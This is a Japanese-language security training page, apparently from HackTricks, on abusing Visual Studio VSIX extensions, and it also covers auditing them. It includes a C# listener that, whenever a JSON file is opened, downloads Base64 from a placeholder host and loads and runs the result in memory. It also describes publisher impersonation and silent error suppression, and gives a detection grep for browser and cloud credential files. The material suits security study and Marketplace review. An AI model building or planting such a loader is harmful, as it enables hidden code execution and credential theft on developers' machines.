# Visual Studio VSIX Extension Abuse

{{#include ../banners/hacktricks-training.md}}

Visual Studio extensionは、日常的なエディター操作を、ログオン中のユーザーのIDで実行されるコードに変える可能性があります。悪意のあるVSIX、正規の発行元に似せた発行元、または侵害された拡張機能の更新を通じて、通常のインストール経路からそのユーザーに到達できます。管理者プロンプトを使ったインストールは、ユーザーの同意に基づくインストール経路であり、自動的な権限昇格ではありません。<sup>[[1]](#references)</sup>

## 実行モデル

従来のVSSDK拡張機能は、一般に`devenv.exe`内で実行されます。新しい`VisualStudio.Extensibility`モデルでは、主に最新の.NET拡張機能を別プロセスで実行します。Visual Studioは専用の`Microsoft.ServiceHub.Host.Extensibility`プロセスに呼び出しを仲介し、IDEの安定性を分離しますが、拡張機能をユーザーのWindows権限から**サンドボックス化するわけではありません**。実行ファイル名には、`ServiceHub.Host.Extensibility.arm64.exe`のようにアーキテクチャのサフィックスが含まれる場合があります。<sup>[[1]](#references)[[2]](#references)</sup>

### 通常のエディター操作をトリガーにする

目立つメニューコマンドだけを公開するのではなく、拡張機能は`ITextViewOpenClosedListener`を実装できます。その`TextViewOpenedAsync`コールバックは、条件に一致するドキュメントに対して呼び出されます。また、`TextViewExtensionConfiguration.AppliesTo`を使って、JSONのような一般的な種類にアクティベーションを限定できます。実際のformatterやlinterが宣伝どおりの処理を行う一方で、ファイルを開いたときに副作用として別のアクションを実行することも可能です。<sup>[[1]](#references)[[3]](#references)</sup>

以下の簡略化したパターンは、重要な実行ポイントを示しています。説明を分かりやすくするため、正規のformatter処理とエラー処理は省略しています。<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>イベントをトリガーとするインメモリのmanaged assemblyローダー</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

このチェーンはBase64テキストをダウンロードし、assembly bytesにデコードして、collectibleな`AssemblyLoadContext`を介して`MemoryStream`から読み込み、リフレクションで取得した`EntryPoint`をパラメーターなし、または`string[]`で呼び出し、非同期のエントリーポイントをawaitしてからコンテキストをアンロードします。第2ステージはディスクに書き込まれませんが、VSIXとメインのextension DLLはディスク上に残ります。Base64には真正性も機密性もなく、HTTPを使うと経路上の攻撃者によるレスポンスの置き換えも可能です。<sup>[[1]](#references)</sup>

運用上のバリエーションとして、stagingに失敗しても告知された機能を継続できるようすべての例外を抑制したり、編集後にトリガーされるよう`ITextViewChangedListener`を使ったりできます。コードはextension host内で実行され、そのユーザーが利用できるmanaged API、P/Invoke、ファイル、認証情報、子プロセスを利用できます。<sup>[[1]](#references)</sup>

native pluginの自動読み込みを利用する、エディター固有の関連する実行サーフェスについては、以下を参照してください。

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Marketplaceと配布経路の信頼悪用

VSIXは、直接共有またはフィッシングされたファイル、Web Marketplace、あるいはVisual Studioに組み込まれたMarketplaceブラウザー経由で配布されます。主に一意性と予約語リストを適用するpublisher登録では、見た目が紛らわしいpublisher IDが許可される可能性があります。すでに信頼されているpublisherやextensionを侵害できれば、インストール済みのユーザーベースを引き継げるため、さらに効果的です。MarketplaceからインストールするとVisual Studio Installerが起動し、ダウンロードしたVSIXは一時的に`%LOCALAPPDATA%\Temp`に配置されます。`payload.vsix`も正規の用途で使用されるため、ファイル名だけでは侵害の兆候になりません。<sup>[[1]](#references)</sup>

MDSecは、extensionを直接インストールするVisual Studio URL protocolを特定していません。オペレーターは依然としてユーザーにVSIXをインストールして信頼させる必要があるか、既存extensionの配布経路を侵害しなければなりません。`AllUsers`パッケージはVisual Studioのインストールフォルダーにインストールされ、昇格を要求する場合がありますが、これは同意を伴う通常のインストーラー動作であり、自動的にadministratorやSYSTEM権限を得る手段ではありません。<sup>[[1]](#references)[[4]](#references)</sup>

### 大規模な静的監査

VSIXパッケージは通常ZIPコンテナーなので、安全なMarketplaceレビューのパイプラインでは、extensionコードを**読み込まずに**パッケージを列挙して展開し、マニフェストを解析して実行可能なサーフェスを特定し、`ilspycmd`でmanaged assemblyを逆コンパイルできます。一般的な同梱依存関係を除外したうえでextensionが所有するassemblyを優先し、認証情報ストアに関する文字列と、ファイル読み取り＋ネットワーク送信、エンコード＋送信、ダウンロード＋実行、credential manager＋ネットワークアクセス、スクリーンショット＋送信といった挙動の組み合わせを関連付けます。<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

また、すべての実行面が managed code だと決めつけず、native DLL、MSBuild targets、scripts、T4 templates、installer payloads も調査してください。不審な動作は、マニフェストに記載された目的と照らし合わせてください。telemetry や正規の updater も、exfiltration や staging に見えることがあります。静的解析だけでは、packed、obfuscated、動的に解決されるコードや休眠コードを見落とします。また、最新バージョンだけを調査すると、過去の悪意あるリリースを見逃します。<sup>[[1]](#references)</sup>

VS Code は、異なる extension host とマニフェストを使用します。自動的な VS Code extension のインストールにつながる書き込み可能な共有フォルダーについては、[VS Code extension drop-share execution](vscode-extension-abuse.md) を参照してください。

別の project-load 攻撃では、VSIX をインストールせずに悪意ある [MSBuild `GetFrameworkPaths` target](visual-studio-project-msbuild-execution.md) を実行できます。<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Visual Studio 拡張機能再考](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - VisualStudio.Extensibility について](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - VSIX パッケージの構造](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET ツール](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Blinder Tunnel キャンペーン、イラクのインフラを標的に](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
